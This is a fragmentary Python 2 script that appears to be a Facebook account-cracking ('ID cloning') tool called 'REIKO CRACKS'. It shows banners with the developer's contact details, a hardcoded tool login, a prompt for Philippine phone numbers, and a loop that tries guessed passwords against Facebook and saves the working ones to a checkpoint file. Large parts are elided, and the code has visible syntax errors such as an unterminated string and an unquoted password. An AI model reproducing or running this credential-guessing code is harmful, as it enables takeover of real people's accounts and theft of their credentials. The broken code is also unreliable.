...
try:
    ...
    time.sleep(1)
    os.system('Then type: python2 REIKO)
...
\033[1;91m              WELCOME TO REIKO CRACKS :)) 
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;92m➣ \033[1;96mTHANKS FOR USE MY COMMANDS ..
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;92m➣ \033[1;92mDEVOLPER   :         REIKO (CK)
\033[1;91m➣ \033[1;92mFACEBOOK   :         REIKO BNS     
\033[1;96m➣ \033[1;92mGITHUB         :           REIKOCRAKS
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;92m➣ \033[1;96mCloning Ids Open 2To 3days..
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••                  
"""
...
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91m➣ DEVOLPER     :       REIKO (CK)
\033[1;92m➣ FACEBOOK     :        REIKO BNS
\033[1;97m➣ GITHUB       :            REIKOCRAKS
\033[1;93m➣ WHATAAPP     :       +923188214452
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
\055[1:97m                        REIKO CRAKS
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
"""
logo2 = """
    ███████▓▒░░▒▓███████.   ▒▓█▓▒ ░. ▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓██████░▒▓█▓▒░░.  ▒▓█▓▒░. ▒▓█▓▒░░.    ▒▓█▓▒░ 
...
\033[1;91m➣ DEVOLPER     :      REIKO (CK)
\033[1;92m➣ FACEBOOK     :     REIKO BNS
\033[1;97m➣ GITHUB       :         REIKO CKH
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91m➣ \033[1'96mTHANKS FOR USING THIS
\033[1;97m••••••••••••••••••••••••••••RK•••••••••••••••••••••••••••••
CorrectUsername = "REIKO"
CorrectPassword = REIKOPOGI

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m➣ 93mTOOL USERNAME \x1b[1;97m»» \x1b[1;97m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;92m➣ \x1b[1;93mTOOL PASSWORD \x1b[1;97m»» \x1b[1;97m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev: REIKO CKH
	    time.sleep(2)
            loop = 'false'
        else:
...
def action():
    ...
    if peak =='':
        ...
        os.system("clear")
        print logo2
        print "\033[1;91m➣ \033[1;97mEnter any Philippines Number"+'\n'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[JUUST-NOW] ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[JUST-NOW] ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/Checkpoint.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[JUST-NOW] ' + k + c + user + '  |  ' + pass3
                                okb = open('save/Checkpoint.txt', 'a')
